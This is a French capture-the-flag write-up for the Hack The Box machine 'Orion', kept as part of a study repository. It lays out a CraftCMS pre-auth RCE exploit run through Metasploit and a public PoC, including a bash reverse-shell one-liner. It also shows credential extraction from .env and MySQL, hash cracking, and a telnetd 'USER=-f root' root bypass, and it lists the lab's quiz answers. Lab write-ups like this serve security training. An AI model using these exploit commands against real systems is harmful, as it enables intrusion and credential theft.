[⬅ Retour à Machines](README.md) · [🏠 Accueil du repo](../../README.md)

# Machine 2 — Orion

**CraftCMS pre-auth RCE (CVE-2025-32432) + telnetd auth bypass (CVE-2026-24061) — Easy / Linux**

| | |
|---|---|
| **OS** | Linux |
| **Difficulté** | Easy |
| **Points** | 20 |
| **Services** | SSH (22) · HTTP / nginx (80) → CraftCMS 5.6.16 |
| **Vulnérabilité principale** | CVE-2025-32432 (RCE pré-auth) + CVE-2026-24061 (bypass telnetd) |

## Concept

Un site CraftCMS 5.6.16 est exposé sur `orion.htb`. La version est vulnérable à une RCE pré-authentifiée (**CVE-2025-32432**) via l'endpoint de transformation d'image (object injection Yii2 + empoisonnement de session PHP). Après un shell `www-data`, le fichier `.env` révèle les credentials MySQL. Le hash bcrypt de l'utilisateur `adam` est cracké et réutilisé pour SSH. La privesc exploite un `telnetd` GNU inetutils 2.7 local (`127.0.0.1:23`) vulnérable à un bypass d'authentification via la variable d'environnement `USER` (**CVE-2026-24061**).

```mermaid
flowchart LR
    A["nmap -sC -sV"] --> B["CraftCMS 5.6.16<br/>sur orion.htb"]
    B --> C["CVE-2025-32432<br/>RCE pre-auth Yii2"]
    C --> D["Shell www-data"]
    D --> E["Lecture .env<br/>credentials MySQL"]
    E --> F["Dump table users<br/>hash bcrypt adam"]
    F --> G["hashcat -m 3200<br/>→ darkangel"]
    G --> H["SSH adam@orion.htb"]
    H --> I["ss -tulnp<br/>telnetd sur 127.0.0.1:23"]
    I --> J["CVE-2026-24061<br/>USER='-f root'"]
    J --> K["Shell root"]
```



## Énumération

### Nmap

```bash
echo "10.129.x.x orion.htb" | sudo tee -a /etc/hosts
nmap -sC -sV 10.129.x.x
```

```
22/tcp open  ssh    OpenSSH 8.9p1
80/tcp open  http   nginx → redirige vers orion.htb
```

### Fingerprint du CMS

```bash
curl -s http://orion.htb/admin/login | grep -o "Craft CMS [0-9.]*"
```

```
Craft CMS 5.6.16
```

---

## Foothold — CVE-2025-32432 (RCE pré-auth CraftCMS)

CraftCMS ≤ 5.6.16 est vulnérable à une RCE pré-authentifiée via l'endpoint `generate-transform` : object injection Yii2 combinée à un empoisonnement de session PHP.

**Option 1 — Metasploit**

```bash
msfconsole -q
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS orion.htb
set RPORT 80
set LHOST <TON_IP_TUN0>
set LPORT 4444
run
```

**Option 2 — PoC public**

```bash
git clone https://github.com/c0gnit00/CVE-2025-32432
cd CVE-2025-32432 && pip3 install requests urllib3

python3 exploit.py -u http://orion.htb -c "id"
python3 exploit.py -u http://orion.htb -c "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"
```

→ shell obtenu en tant que `www-data`.

---

## User — adam

### Credentials MySQL dans `.env`

```bash
cat /var/www/html/craft/.env
```

```
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_DATABASE=orion
```

### Dump des utilisateurs

```bash
mysql -u root -p'SuperSecureCraft123Pass!' orion -e "SELECT username, email, password FROM users;"
```

→ hash bcrypt de l'utilisateur `adam`.

### Crack du hash (sur Kali)

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```
darkangel
```

### SSH

```bash
ssh adam@orion.htb
# Password: darkangel
cat user.txt
```

---

## Privilege Escalation — CVE-2026-24061 (telnetd auth bypass)

### Découverte

```bash
ss -tulnp | grep 23
```

```
127.0.0.1:23  LISTEN   telnetd
```

```bash
telnet --version
# GNU inetutils 2.7
```

Cette version de `telnetd` est vulnérable à un **bypass d'authentification trivial** : la variable d'environnement `USER` peut être détournée pour injecter un flag `-f` (login automatique sans mot de passe).

### Exploitation

```bash
USER="-f root" telnet -a 127.0.0.1
# ou : env USER='-f root' telnet -a 127.0.0.1 23
```

→ shell root immédiat.

```bash
whoami
# root
cat /root/root.txt
```

---

## Flags

| | |
|---|---|
| **User** | *(unique à l'instance — `/home/adam/user.txt`)* |
| **Root** | *(unique à l'instance — `/root/root.txt`)* |

## Réponses aux questions HTB

| Question | Réponse |
|---|---|
| How many open TCP ports are listening on Orion? | **2** |
| What is the version of CraftCMS running on the target? | **5.6.16** |
| Which user is running CraftCMS? | **www-data** |
| Which file contains the password for the MySQL database? | **.env** |
| What is the password that can be obtained from the MySQL database? | **darkangel** |
| Which service, unrelated to CraftCMS, is open only locally on Orion? | **telnet** |
| What is the version of the service found? | **2.7** |

## Points clés

- Toujours identifier la version exacte d'un CMS (footer, `/admin/login`, headers, `composer.lock`) — elle détermine directement les CVE applicables.
- **CVE-2025-32432** (CraftCMS ≤ 5.6.16) : RCE pré-auth via object injection Yii2 sur l'endpoint `generate-transform` + empoisonnement de session PHP. Metasploit ou PoC public suffisent.
- Le fichier `.env` de CraftCMS contient presque toujours les credentials de la base de données en clair — premier réflexe après un shell web.
- Réutilisation de mot de passe entre l'application (CraftCMS admin) et le système (SSH) : très fréquent sur les machines Easy.
- Les services qui n'écoutent que sur `127.0.0.1` (telnet, MySQL...) sont invisibles depuis l'extérieur — toujours ré-énumérer les ports après l'obtention d'un shell.
- **CVE-2026-24061** (GNU inetutils telnetd ≤ 2.7) : bypass d'authentification trivial via `USER="-f root"`. Un one-liner suffit pour obtenir root.

## Leçon retenue

*Une RCE pré-auth sur un CMS mal patché, combinée à des credentials en clair dans un `.env` et à un service legacy local (`telnetd`) vulnérable à un bypass trivial, suffit à passer de zéro à root en quelques étapes. Toujours vérifier les services locaux et les fichiers de configuration applicatifs après un premier shell.*

---

[⬅ Précédent : Cap](cap.md) · [⬆ Index Machines](README.md) · [Suivant : Nexus ➡](nexus.md)
